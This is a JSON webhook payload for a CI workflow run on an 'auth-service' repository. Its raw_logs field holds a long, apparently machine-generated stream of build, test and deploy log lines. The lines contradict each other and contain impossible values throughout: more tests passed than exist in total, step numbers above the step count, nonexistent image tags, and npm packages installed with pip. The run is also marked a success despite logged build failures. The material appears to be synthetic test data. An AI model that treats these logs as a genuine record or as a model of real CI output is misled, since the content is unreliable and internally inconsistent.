{
  "action": "completed",
  "workflow_run": {
    "id": 659,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "7a808fd50a14882e0ccbe9e31f2911b7348bed8a",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-21T12:19:30.477811Z",
    "updated_at": "2025-11-21T12:21:26.570991Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "charlie"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\n[12:19:30] DEBUG: Initializing service\nSnapshots: 48 passed, 35 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (19MB)\nnpm notice: created a lockfile\nReady.\nStep 14/21: Deploying\n\u2713 package completed\nStep 7/16: Running migrations\n[12:19:30] DEBUG: Connection pool: 4 active\n[12:19:30] INFO: Connecting to database\nChecking out master branch\nCache restored successfully (359MB)\n\u2713 All checks passed\nUsing Node.js 17.18.10\nNODE_ENV=production\n[12:19:30] DEBUG: Memory usage: 1800MB\nTransforming 937 files...\nHEAD is now at b9643bc\n[12:19:30] DEBUG: Memory usage: 723MB\nLoading...\nWaiting...\nImage pulled successfully\nConnection established\nnpm notice: created a lockfile\n[12:19:30] WARN: Deprecated API usage\nCoverage: 91% statements, 83% branches\nPOST /upload - 201 (247ms)\n  PASS: unit/test_db_connect.spec.js\n[12:19:30] DEBUG: Memory usage: 514MB\n\u2713 All checks passed\nException: TypeError\nUploading artifact 'coverage' (2 files)\nSuccess!\nWARNING: webpack has known vulnerabilities\nTests: 422 passed, 97 total\nWARNING: lodash has known vulnerabilities\nSwitched to branch 'bugfix/task-972'\nTime: 114.882s\nnpm notice: package.json updated\n[12:19:30] DEBUG: Connection pool: 2 active\nnpm install: added 321 packages\nWARNING: eslint has known vulnerabilities\n  PASS: integration/test_cache_hit.spec.js\n\u2713 All checks passed\npip: Downloading express-4.5.tar.gz\nWaiting...\nRan 49 tests in 52s\nUploading artifact 'coverage' (4 files)\npip: Collecting react\npip: Installing build dependencies...\nCompiling components/app.ts...\n[12:19:30] INFO: Processing request\n\u2713 Task completed in 4562ms\nConnection established\nStep 16/22: Installing dependencies\nStep 13/23: Running migrations\nFinished.\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (98MB)\nUploading artifact 'build' (17 files)\nPOST /upload - 201 (95ms)\nUsing Python 3.11\n\u2713 Step 'setup' succeeded\nStep 8/15: Installing dependencies\nException: ValueError\n[12:19:30] INFO: Connecting to database\nOptimizing 52 modules...\nnpm install: added 426 packages\nCache saved successfully\nSuccess!\nCache hit for key-5394\nStep 10/17: Testing\nnpm install: added 30 packages\nSwitched to branch 'bugfix/task-180'\nHEAD is now at c28b264\nStep 5/17: Building\nImage pulled successfully\n  PASS: integration/test_db_connect.spec.js\nCache miss for key-5160\n[12:19:30] DEBUG: Query executed in 52ms\n[12:19:30] WARN: Deprecated API usage\nCompiling lib/main.py...\nReady.\n  PASS: test_db_connect (478ms)\nnpm notice: package.json updated\nTransforming 562 files...\nSuccess!\nSuccess!\nCache miss for key-6492\nOK\n\u2713 All checks passed\nTLS handshake completed\nInstalling react@2.0.9\nTLS handshake completed\n  PASS: test_cache_hit (317ms)\nLayer 8/14: COPY command\npip: Downloading eslint-1.16.tar.gz\n[12:19:30] WARN: Deprecated API usage\nCache hit for key-3239\npip: Collecting react\nTLS handshake completed\nDone.\nInstalling react@4.9.5\n[12:19:30] INFO: Request completed\n[12:19:30] INFO: Connecting to database\nTest Suites: 45 passed, 34 total\nBundling styles.css\nReady.\n[12:19:30] DEBUG: Memory usage: 1549MB\nnpm notice: created a lockfile\nOK\n[12:19:30] DEBUG: Initializing service\n\u2713 Step 'setup' succeeded\nAlready up to date.\nMinifying main.js\nCreating production build...\nStep 9/16: Testing\nWARNING: jest has known vulnerabilities\nReady.\nCache miss for key-7415\nnpm install: resolved 1640 packages\nnpm install: resolved 599 packages\n[12:19:30] INFO: Cache refreshed\nCompleted.\nAlready up to date.\nConnection established\nLoading...\nArtifact uploaded: build.tar.gz (31MB)\nnpm install: resolved 420 packages\nLoading...\nGET /health - 200 (43ms)\nPlatform: darwin-arm64\nLoading...\n[12:19:30] ERROR: Connection failed\nImage pulled successfully\nCompiling src/index.js...\n[12:19:30] INFO: Cache refreshed\n  PASS: unit/test_cache_hit.spec.js\nCoverage: 99% statements, 62% branches\n=== Step install_dependencies completed ===\n=== Step: integration_tests ===\nArtifact uploaded: build.tar.gz (18MB)\nCompiling lib/main.py...\n\u2713 All checks passed\nProcessing...\nnpm notice: package.json updated\n[12:19:30] INFO: Request completed\nMinifying app.js\nProcessing...\nGenerating source maps...\nConnection established\nSuccess!\nCompiling lib/main.py...\n\u2713 Step 'checkout' succeeded\nStep 10/19: Building\nImage pulled successfully\n[12:19:30] INFO: Starting build process\n[12:19:30] WARN: Deprecated API usage\nCompiling utils/service.java...\n  PASS: test_cache_hit (395ms)\nMinifying main.js\nAlready up to date.\n  PASS: integration/test_auth_login.spec.js\nCache saved successfully\n\u2713 Step 'build' succeeded\n[12:19:30] DEBUG: Initializing service\nStep 7/17: Installing dependencies\nCache saved successfully\npip: Collecting express\n[12:19:30] INFO: Processing request\nCreating production build...\nStep 5/16: Running migrations\nStep 8/19: Deploying\n  PASS: e2e/test_auth_login.spec.js\nTransforming 530 files...\nException: TypeError\nCache restored successfully (207MB)\nArtifact uploaded: dist.zip (16MB)\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (1MB)\nFinished.\nChecking out develop branch\nConnecting to test.io:443...\nFinished.\nLayer 4/15: ENV command\nUsing Node.js 15.20.6\nArtifact uploaded: dist.zip (21MB)\nWARNING: eslint has known vulnerabilities\n[12:19:30] DEBUG: Connection pool: 4 active\n[12:19:30] INFO: Request completed\nNODE_ENV=development\n\u2713 Step 'install' succeeded\nnpm install: added 160 packages\nStep 8/23: Running migrations\nCache invalidated: node_modules\nBundling vendor.js\npip: Collecting react\nDone.\nGenerating source maps...\nStep 15/20: Testing\nArtifact downloaded: 27MB\npip install: Successfully installed eslint-3.17\nPlatform: linux-x64\n[12:19:30] DEBUG: Connection pool: 17 active\nTests: 455 passed, 460 total\nCompiling lib/app.ts...\nNODE_ENV=production\nUploading artifact 'coverage' (37 files)\n\u2713 Task completed in 245ms\nHEAD is now at 0d1ed2b\n[12:19:30] WARN: Deprecated API usage\nOptimizing 23 modules...\n[12:19:30] INFO: Cache refreshed\nStep 14/23: Running migrations\n\u2713 Task completed in 738ms\nUsing Python 3.11\n[12:19:30] DEBUG: Connection pool: 13 active\nImage pulled successfully\nCache invalidated: node_modules\nFAILED: test_cache_hit\nCache restored successfully (241MB)\nDone.\nCompleted.\nChecking out develop branch\nStep 17/17: Building\n\u2713 Step 'build' succeeded\nStep 20/15: Linting\nWaiting...\n[12:19:30] INFO: Processing request\nWARNING: axios has known vulnerabilities\n  PASS: e2e/test_db_connect.spec.js\nConnection established\nUsing Node.js 15.5.5\n\u2713 Step 'build' succeeded\nCache invalidated: dependencies\nPlatform: win32-x64\nConnection established\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/service.java...\nBuilding Docker image...\n[12:19:30] DEBUG: Loading configuration\nUploading artifact 'build' (43 files)\nStep 17/19: Linting\nStep 15/20: Deploying\nImage pulled successfully\nCache hit for key-9193\nChecking out develop branch\nyarn add: Done in 8.92s\n[12:19:30] WARN: Deprecated API usage\n[12:19:30] INFO: Processing request\n\u2713 Task completed in 4656ms\nStep 10/15: Running migrations\nUsing Python 3.9\nHEAD is now at 8dab990\nFinished.\nyarn add: Done in 7.62s\n[12:19:30] INFO: Cache refreshed\nCache saved successfully\n\u2713 lint completed\nDone.\nTest Suites: 23 passed, 5 total\nChecking out develop branch\nCompiling utils/index.js...\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: dist.zip (82MB)\nOptimizing 37 modules...\nPushing to registry...\nWARNING: prettier has known vulnerabilities\nReady.\n[12:19:30] INFO: Processing request\nUsing Python 3.9\nImage pulled successfully\nArtifact downloaded: 22MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUploading artifact 'build' (15 files)\n[12:19:30] DEBUG: Query executed in 44ms\nMinifying app.js\nSnapshots: 32 passed, 31 total\nTime: 113.604s\nWARNING: react has known vulnerabilities\nTest Suites: 9 passed, 21 total\n=== Step integration_tests completed ===\n=== Step: build ===\nPlatform: linux-x64\npip: Installing build dependencies...\nCache hit for key-8689\nCoverage: 78% statements, 70% branches\nStep 19/15: Linting\n  PASS: test_db_connect (254ms)\npip: Collecting express\n[12:19:30] WARN: Deprecated API usage\nSwitched to branch 'feature/task-591'\nFinished.\nSuccess!\nyarn add: Done in 8.37s\nCache invalidated: build\nDone.\nBundling runtime.js\nFinished.\nReady.\nTests: 148 passed, 406 total\nChecking out master branch\n[12:19:30] DEBUG: Memory usage: 1709MB\n[12:19:30] INFO: Cache refreshed\nTLS handshake completed\n[12:19:30] WARN: Deprecated API usage\n\u2713 Step 'setup' succeeded\nSuccess!\nNODE_ENV=production\nArtifact uploaded: build.tar.gz (19MB)\nPushing to registry...\nConnection established\n[12:19:30] DEBUG: Initializing service\n[12:19:30] WARN: Deprecated API usage\n[12:19:30] ERROR: Connection failed\nyarn add: Done in 17.53s\nChecking out develop branch\n  PASS: integration/test_auth_login.spec.js\nImage pulled successfully\nnpm notice: package.json updated\nPOST /upload - 201 (478ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:30] INFO: Starting build process\nnpm notice: package.json updated\nStep 6/18: Deploying\nArtifact uploaded: build.tar.gz (15MB)\n[12:19:30] DEBUG: Loading configuration\nStep 14/18: Running migrations\nBuilding Docker image...\nWaiting...\nInstalling webpack@3.10.0\nWARNING: express has known vulnerabilities\n[12:19:30] INFO: Cache refreshed\nStep 11/15: Running migrations\nCache invalidated: node_modules\nStep 19/15: Building\nPushing to registry...\n  PASS: test_api_health (50ms)\nUploading artifact 'coverage' (37 files)\n[12:19:30] INFO: Starting build process\n[12:19:30] DEBUG: Memory usage: 984MB\nMinifying main.js\nCompiling utils/handler.rs...\n[12:19:30] INFO: Request completed\nOptimizing 91 modules...\nPlatform: darwin-arm64\nStep 17/21: Deploying\nTransforming 951 files...\npip: Installing build dependencies...\nStep 4/15: Deploying\npip: Collecting webpack\nDone.\nTransforming 522 files...\nCache miss for key-9277\nDone.\n[12:19:30] WARN: Deprecated API usage\nSnapshots: 48 passed, 0 total\n[12:19:30] DEBUG: Memory usage: 467MB\nMinifying main.js\nWaiting...\nCoverage: 92% statements, 70% branches\n\u2713 package completed\nUsing Python 3.12\nSuccess!\n\u2713 Step 'install' succeeded\nUsing Node.js 14.6.1\nTest Suites: 11 passed, 10 total\nConnecting to example.com:443...\nBuilding Docker image...\nReady.\npip: Collecting express\nLayer 3/9: COPY command\nConnection established\nCompiling lib/app.ts...\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\n[12:19:30] DEBUG: Memory usage: 233MB\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nProcessing...\nStep 6/17: Installing dependencies\nArtifact uploaded: dist.zip (10MB)\n\u2713 All checks passed\nPlatform: darwin-arm64\n[12:19:30] INFO: Request completed\nStep 19/18: Deploying\n\u2713 Step 'install' succeeded\nStep 5/25: Testing\nTime: 83.461s\npip install: Successfully installed jest-5.17\nEnvironment: production\nUsing Python 3.11\npip install: Successfully installed webpack-3.4\n\u2713 test completed\n[12:19:30] INFO: Connecting to database\nFinished.\nGET /api - 200 (61ms)\nStep 16/17: Testing\n[12:19:30] DEBUG: Connection pool: 4 active\nLoading...\nCoverage: 75% statements, 94% branches\nCache miss for key-4510\nnpm install: added 208 packages\nFAILED: test_user_create\nConnecting to acme.corp:443...\nProcessing...\nArtifact downloaded: 8MB\nNODE_ENV=development\nHEAD is now at 1943e2f\n\u2713 Step 'build' succeeded\n\u2713 Task completed in 3416ms\n\u2717 build failed with exit code 122\npip: Collecting lodash\nCache restored successfully (79MB)\n[12:19:30] WARN: Deprecated API usage\nOK\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 55 tests in 44s\nUsing Python 3.12\nPulling image: python:18\nCreating production build...\n=== Step build completed ===\n=== Step: deploy_staging ===\nConnecting to test.io:443...\nWaiting...\nSuccess!\npip: Installing build dependencies...\nCache hit for key-6654\nLoading...\nnpm notice: package.json updated\nCoverage: 96% statements, 75% branches\nBuilding Docker image...\nUploading artifact 'dist' (17 files)\nNODE_ENV=test\nGET /api - 201 (39ms)\nImage pulled successfully\nyarn add: Done in 10.80s\nTime: 6.362s\npip: Downloading prettier-2.20.tar.gz\nCompiling utils/utils.go...\nStep 10/17: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:30] DEBUG: Memory usage: 1539MB\nTest Suites: 8 passed, 39 total\nPOST /data - 201 (105ms)\nFinished.\nStep 14/15: Building\n  PASS: test_cache_hit (353ms)\nFinished.\nWARNING: express has known vulnerabilities\nCompiling src/main.py...\nBundling vendor.css\n\u2713 Task completed in 2979ms\nTest Suites: 46 passed, 29 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\n[12:19:30] INFO: Request completed\n[12:19:30] INFO: Cache refreshed\nyarn add: Done in 8.92s\nStep 10/15: Building\nTime: 41.321s\nStep 5/25: Testing\nDone.\nTransforming 706 files...\nArtifact uploaded: build.tar.gz (35MB)\nPOST /api - 200 (149ms)\nGET /health - 204 (28ms)\npip install: Successfully installed axios-2.9\n\u2713 Task completed in 463ms\nSnapshots: 1 passed, 43 total\nBundling vendor.css\nStep 5/22: Running migrations\nNODE_ENV=test\nBundling styles.css\nLayer 7/14: ENV command\nStep 2/20: Installing dependencies\nHEAD is now at f4dee0b\nPushing to registry...\n[12:19:30] WARN: Deprecated API usage\nOptimizing 36 modules...\nBundling main.css\n\u2717 build failed with exit code 103\nRan 112 tests in 10s\nConnection established\nImage pulled successfully\n[12:19:30] WARN: Deprecated API usage\nLoading...\nFinished.\n[12:19:30] DEBUG: Query executed in 69ms\nCache hit for key-1283\nConnection established\nStep 8/17: Linting\n[12:19:30] DEBUG: Loading configuration\nLayer 4/14: COPY command\nCompiling utils/service.java...\nConnection established\nFetching submodules...\nSuccess!\nFinished.\n[12:19:30] INFO: Request completed\nVerifying...\n\u2713 All checks passed\nCompiling components/handler.rs...\nBuilding Docker image...\nCache hit for key-1583\nSwitched to branch 'feature/task-504'\nFAILED: test_cache_hit\nCompiling components/service.java...\nEnvironment: development\n[12:19:30] INFO: Starting build process\nChecking out main branch\nTests: 168 passed, 100 total\n[12:19:30] DEBUG: Loading configuration\nOptimizing 84 modules...\n[12:19:30] DEBUG: Loading configuration\nWARNING: express has known vulnerabilities\nTime: 37.777s\nEnvironment: test\n[12:19:30] INFO: Starting build process\nCreating production build...\n\u2713 package completed\nUsing Node.js 20.9.4\nyarn add: Done in 6.68s\nWARNING: axios has known vulnerabilities\nTest Suites: 40 passed, 50 total\npip: Downloading axios-1.17.tar.gz\nCache miss for key-4057\nCompiling components/main.py...\nVerifying...\npip: Downloading jest-5.5.tar.gz\nCache saved successfully\npip: Downloading jest-5.8.tar.gz\nCoverage: 94% statements, 60% branches\nFinished.\nTransforming 370 files...\n[12:19:30] WARN: Deprecated API usage\nDone.\nSwitched to branch 'feature/task-259'\nArtifact uploaded: build.tar.gz (8MB)\nnpm install: resolved 1447 packages\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching submodules...\nMinifying app.js\nSwitched to branch 'bugfix/task-314'\nSuccess!\nGET /status - 201 (90ms)\nArtifact uploaded: build.tar.gz (45MB)\nProcessing...\nnpm install: resolved 935 packages\npip: Collecting axios\nCompiling components/main.py...\nCache restored successfully (53MB)\nHEAD is now at fee43f6\nArtifact uploaded: build.tar.gz (5MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nWaiting...\nTime: 46.147s\n[12:19:30] INFO: Processing request\nConnecting to startup.dev:443...\nCreating production build...\n[12:19:30] ERROR: Connection failed\n\u2713 Task completed in 3171ms\n=== Step deploy_staging completed ===\n=== Step: setup_environment ===\nConnection established\nCache hit for key-6955\n[12:19:30] WARN: Deprecated API usage\n\u2713 Step 'build' succeeded\nDone.\n[12:19:30] INFO: Cache refreshed\npip: Downloading webpack-3.20.tar.gz\nStep 13/19: Deploying\npip: Installing build dependencies...\nGET /status - 200 (1ms)\n[12:19:30] INFO: Cache refreshed\nVerifying...\nPulling image: python:3.11\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\nArtifact uploaded: dist.zip (64MB)\nBuilding Docker image...\nCompleted.\nTLS handshake completed\nStep 10/19: Deploying\nFinished.\nArtifact uploaded: dist.zip (4MB)\nChecking out master branch\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: axios has known vulnerabilities\nCreating production build...\nChecking out master branch\nCreating production build...\nFetching submodules...\nBuilding Docker image...\nUsing Python 3.9\nArtifact uploaded: dist.zip (57MB)\nArtifact uploaded: dist.zip (90MB)\nUsing Node.js 20.4.10\nSuccess!\nReady.\nLoading...\nStep 6/20: Deploying\nCache hit for key-9823\nSuccess!\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\npip: Downloading axios-2.20.tar.gz\nLoading...\nFetching submodules...\nnpm notice: created a lockfile\nImage pulled successfully\nImage pulled successfully\nWaiting...\n\u2713 Task completed in 4476ms\n[12:19:30] INFO: Starting build process\nFetching submodules...\nAlready up to date.\nTransforming 284 files...\nSnapshots: 24 passed, 49 total\n[12:19:30] DEBUG: Initializing service\nTLS handshake completed\n\u2713 build completed\nCache miss for key-5086\nFAILED: test_db_connect\nCache hit for key-8162\nCache hit for key-2792\nRan 24 tests in 50s\nnpm notice: created a lockfile\nBundling main.css\nCoverage: 75% statements, 94% branches\nImage pulled successfully\nTime: 40.531s\n\u2713 Step 'test' succeeded\nCache hit for key-4845\nSnapshots: 30 passed, 32 total\nCreating production build...\n[12:19:30] INFO: Cache refreshed\nConnection established\npip: Collecting react\nConnecting to cloud.services:443...\npip: Installing build dependencies...\nSwitched to branch 'hotfix/task-317'\nDone.\nProcessing...\nCompiling lib/main.py...\n[12:19:30] DEBUG: Connection pool: 15 active\nConnecting to acme.corp:443...\nArtifact uploaded: dist.zip (91MB)\n[12:19:30] INFO: Request completed\n  PASS: unit/test_auth_login.spec.js\n[12:19:30] INFO: Connecting to database\n[12:19:30] INFO: Processing request\nConnecting to test.io:443...\nEnvironment: test\nAlready up to date.\nCache restored successfully (403MB)\nDone.\nPulling image: node:3.11\n[12:19:30] DEBUG: Initializing service\npip: Downloading axios-1.1.tar.gz\nStep 4/17: Building\nStep 18/19: Running migrations\n[12:19:30] DEBUG: Connection pool: 18 active\nSnapshots: 40 passed, 49 total\nStep 14/23: Testing\nnpm notice: created a lockfile\n[12:19:30] INFO: Request completed\nCache saved successfully\nAlready up to date.\nOptimizing 81 modules...\nOK\nConnection established\nReady.\n[12:19:30] INFO: Cache refreshed\nTLS handshake completed\nTests: 137 passed, 413 total\nTLS handshake completed\nWaiting...\nFinished.\nCache hit for key-5461\nProcessing...\nTests: 323 passed, 374 total\nArtifact downloaded: 12MB\nDone.\nUploading artifact 'build' (27 files)\n[12:19:30] INFO: Request completed\n[12:19:30] INFO: Request completed\nnpm install: resolved 227 packages\nConnection established\n  PASS: unit/test_cache_hit.spec.js\n\u2713 build completed\nnpm install: added 435 packages\nCache invalidated: node_modules\nGET /api - 204 (24ms)\nFAILED: test_db_connect\npip: Collecting eslint\n[12:19:30] WARN: Deprecated API usage\n  PASS: e2e/test_cache_hit.spec.js\nnpm install: added 33 packages\nPlatform: win32-x64\nStep 4/19: Linting\nFinished.\nOptimizing 40 modules...\n=== Step setup_environment completed ===\n=== Step: setup_node ===\nCompiling utils/utils.go...\n\u2713 Task completed in 4396ms\npip: Collecting react\nConnecting to test.io:443...\npip install: Successfully installed webpack-3.4\nSnapshots: 37 passed, 48 total\nCache restored successfully (148MB)\nGET /status - 201 (33ms)\nPlatform: win32-x64\nArtifact downloaded: 32MB\nAlready up to date.\nCreating production build...\nRan 62 tests in 57s\nCompiling utils/main.py...\nMinifying app.js\nTransforming 985 files...\nCache miss for key-7702\nnpm notice: package.json updated\n\u2713 deploy completed\nInstalling eslint@4.12.1\n\u2713 Task completed in 4980ms\nConnecting to acme.corp:443...\nnpm install: added 240 packages\nPlatform: darwin-arm64\nPushing to registry...\nTime: 94.190s\nOK\n[12:19:30] INFO: Connecting to database\nCreating production build...\nWARNING: react has known vulnerabilities\nStep 8/21: Running migrations\nSuccess!\n[12:19:30] INFO: Starting build process\nDone.\npip: Downloading eslint-5.15.tar.gz\nMinifying app.js\nArtifact downloaded: 5MB\nSnapshots: 23 passed, 47 total\nChecking out main branch\nBundling runtime.js\nCoverage: 77% statements, 73% branches\nInstalling react@1.9.4\nCache saved successfully\nRan 16 tests in 6s\nTests: 167 passed, 300 total\n\u2717 build failed with exit code 21\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 7/22: Running migrations\nOptimizing 32 modules...\nChecking out master branch\n  PASS: e2e/test_auth_login.spec.js\nStep 14/21: Installing dependencies\nSwitched to branch 'bugfix/task-702'\nWARNING: webpack has known vulnerabilities\nWARNING: prettier has known vulnerabilities\n[12:19:30] INFO: Processing request\nAlready up to date.\npip: Collecting webpack\nPushing to registry...\n\u2713 validate completed\nFinished.\n\u2713 Task completed in 4324ms\nImage pulled successfully\npip: Collecting express\nTime: 17.117s\nFetching submodules...\nCreating production build...\n[12:19:30] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (34MB)\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 17.5.7\n[12:19:30] INFO: Connecting to database\nnpm notice: package.json updated\nPlatform: win32-x64\n[12:19:30] INFO: Cache refreshed\nBuilding Docker image...\nArtifact downloaded: 45MB\nGET /api - 200 (11ms)\nStep 13/18: Linting\n[12:19:30] ERROR: Connection failed\n[12:19:30] DEBUG: Initializing service\nFetching submodules...\n\u2713 Step 'build' succeeded\nCache saved successfully\n\u2713 Task completed in 4942ms\nBuilding Docker image...\npip: Downloading lodash-1.7.tar.gz\nArtifact uploaded: build.tar.gz (48MB)\nCache miss for key-2982\npip: Downloading react-4.12.tar.gz\n[12:19:30] INFO: Cache refreshed\nTransforming 837 files...\n[12:19:30] INFO: Cache refreshed\nEnvironment: staging\nWaiting...\n[12:19:30] ERROR: Connection failed\nGenerating source maps...\nArtifact downloaded: 33MB\nCompiling utils/app.ts...\nCompiling lib/app.ts...\nnpm install: added 59 packages\nLoading...\nTest Suites: 18 passed, 30 total\nCompiling lib/handler.rs...\n[12:19:30] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 119 tests in 6s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 247 passed, 205 total\n[12:19:30] DEBUG: Initializing service\nNODE_ENV=test\nEnvironment: development\nWARNING: react has known vulnerabilities\nNODE_ENV=test\nSuccess!\n[12:19:30] ERROR: Connection failed\n[12:19:30] INFO: Cache refreshed\nChecking out develop branch\nnpm install: added 260 packages\nCache hit for key-7578\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: TypeError\nBuilding Docker image...\nTLS handshake completed\nStep 19/17: Deploying\nCache invalidated: dependencies\nDone.\nVerifying...\nPlatform: win32-x64\n[12:19:30] DEBUG: Query executed in 82ms\nMinifying vendor.js\nLoading...\nTLS handshake completed\nException: TypeError\nStep 18/23: Linting\nArtifact downloaded: 16MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /data - 200 (208ms)\n[12:19:30] INFO: Request completed\nPushing to registry...\n=== Step setup_node completed ===\n=== Step: e2e_tests ===\nWARNING: prettier has known vulnerabilities\n[12:19:30] DEBUG: Connection pool: 8 active\nAlready up to date.\n[12:19:30] INFO: Request completed\nOptimizing 21 modules...\nCompiling components/main.py...\nDone.\npip: Collecting webpack\nTests: 320 passed, 79 total\nArtifact downloaded: 48MB\nSuccess!\nyarn add: Done in 13.3s\nWARNING: prettier has known vulnerabilities\nStep 20/19: Building\n\u2713 Step 'setup' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:30] DEBUG: Memory usage: 1060MB\nInstalling lodash@4.15.4\nConnecting to example.com:443...\nGenerating source maps...\n\u2713 All checks passed\nOptimizing 33 modules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\n[12:19:30] INFO: Request completed\nyarn add: Done in 7.52s\n[12:19:30] INFO: Cache refreshed\n[12:19:30] INFO: Request completed\nCache miss for key-6521\nTest Suites: 21 passed, 35 total\nCreating production build...\nArtifact downloaded: 4MB\nFetching submodules...\nTime: 36.78s\nnpm install: added 144 packages\n[12:19:30] ERROR: Connection failed\n[12:19:30] INFO: Processing request\nArtifact downloaded: 15MB\nCache invalidated: node_modules\nCache invalidated: build\n[12:19:30] INFO: Cache refreshed\nPOST /data - 202 (428ms)\nInstalling webpack@3.9.1\n\u2713 Task completed in 539ms\nWARNING: prettier has known vulnerabilities\nCompiling src/app.ts...\nPlatform: linux-x64\nDone.\nGET /api - 200 (52ms)\nnpm notice: created a lockfile\nStep 4/15: Testing\nStep 4/20: Deploying\nTime: 47.99s\nSnapshots: 35 passed, 2 total\nCompiling lib/app.ts...\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 903 files...\nCompiling src/service.java...\n\u2713 deploy completed\nCache hit for key-2000\npip install: Successfully installed react-2.13\nCompiling utils/app.ts...\n  PASS: e2e/test_auth_login.spec.js\nNODE_ENV=development\nAlready up to date.\nOK\n\u2717 build failed with exit code 117\nCache hit for key-5931\n\u2713 Task completed in 4279ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Task completed in 3074ms\nWARNING: prettier has known vulnerabilities\nPOST /data - 200 (194ms)\nArtifact downloaded: 22MB\nTests: 491 passed, 55 total\n[12:19:30] INFO: Starting build process\nSnapshots: 21 passed, 13 total\nFAILED: test_auth_login\nChecking out main branch\nOptimizing 94 modules...\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (20MB)\nStep 13/18: Running migrations\nSwitched to branch 'bugfix/task-339'\nWARNING: express has known vulnerabilities\nStep 2/19: Deploying\n  PASS: integration/test_db_connect.spec.js\nStep 5/21: Running migrations\nDone.\nCompleted.\nStep 16/15: Running migrations\nUploading artifact 'coverage' (14 files)\nStep 20/25: Deploying\n[12:19:30] DEBUG: Connection pool: 3 active\nVerifying...\npip install: Successfully installed react-5.4\nCache restored successfully (397MB)\nCompiling src/index.js...\nSwitched to branch 'bugfix/task-331'\n\u2713 All checks passed\n[12:19:30] INFO: Cache refreshed\n[12:19:30] DEBUG: Memory usage: 1650MB\npip: Collecting prettier\nEnvironment: test\nInstalling webpack@2.17.6\nStep 8/23: Building\npip: Downloading prettier-2.7.tar.gz\nTransforming 884 files...\nFinished.\n[12:19:30] INFO: Starting build process\nUploading artifact 'coverage' (4 files)\n[12:19:30] DEBUG: Memory usage: 1534MB\nStep 7/16: Deploying\nBundling main.js\n[12:19:30] INFO: Request completed\npip: Installing build dependencies...\nFinished.\npip: Collecting express\nTest Suites: 8 passed, 37 total\n\u2717 build failed with exit code 71\nWARNING: react has known vulnerabilities\nStep 15/19: Deploying\nPulling image: python:3.11\nCache miss for key-2866\nPlatform: win32-x64\n[12:19:30] DEBUG: Connection pool: 7 active\nWaiting...\n\u2713 All checks passed\nStep 2/19: Building\nUsing Python 3.11\nPulling image: alpine:latest\n\u2713 test completed\nImage pulled successfully\nCompiling components/main.py...\nCompiling lib/app.ts...\nEnvironment: development\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\nCompiling components/index.js...\nEnvironment: production\n[12:19:30] DEBUG: Initializing service\nCache miss for key-3280\n  PASS: e2e/test_auth_login.spec.js\n\u2713 Step 'test' succeeded\nDone.\nVerifying...\nPulling image: python:latest\nImage pulled successfully\n\u2713 Task completed in 733ms\nCompiling utils/main.py...\nCache saved successfully\nHEAD is now at 7197acd\nFinished.\nCache saved successfully\nConnecting to acme.corp:443...\nStep 5/23: Testing\npip: Installing build dependencies...\npip: Collecting lodash\nCompleted.\nSwitched to branch 'bugfix/task-788'\nCache saved successfully\nnpm notice: created a lockfile\n[12:19:30] INFO: Connecting to database\nFetching submodules...\n[12:19:30] DEBUG: Query executed in 72ms\nGenerating source maps...\nPushing to registry...\nArtifact uploaded: build.tar.gz (3MB)\nTransforming 521 files...\nCache restored successfully (140MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:30] DEBUG: Memory usage: 1275MB\nnpm notice: created a lockfile\nSwitched to branch 'hotfix/task-993'\n[12:19:30] INFO: Starting build process\nEnvironment: staging\nSwitched to branch 'bugfix/task-626'\nOK\nConnecting to example.com:443...\nCache invalidated: node_modules\nSuccess!\nTime: 59.693s\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Step 'setup' succeeded\nStep 17/25: Linting\nPulling image: alpine:3.11\nPOST /data - 201 (392ms)\nPOST /upload - 202 (423ms)\nCreating production build...\nWaiting...\npip: Collecting lodash\nProcessing...\nImage pulled successfully\nFetching submodules...\nStep 18/18: Deploying\nPOST /data - 201 (194ms)\nnpm install: resolved 203 